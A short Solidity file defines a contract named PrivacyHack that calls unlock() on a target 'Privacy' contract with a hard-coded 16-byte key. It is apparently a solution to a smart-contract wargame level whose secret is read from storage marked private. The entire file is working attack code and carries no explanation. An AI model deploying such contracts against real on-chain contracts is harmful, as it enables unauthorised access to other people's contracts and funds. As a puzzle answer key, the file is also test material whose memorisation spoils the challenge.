// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Privacy {
    function unlock(bytes16) external;
}

contract PrivacyHack {
    Privacy private victim;
    constructor(address _victim) {
        victim = Privacy(_victim);
    }

    function attack() public {
        victim.unlock(bytes16(0x49db55f6421b84eecd816b8dfbb5554d));
    }
}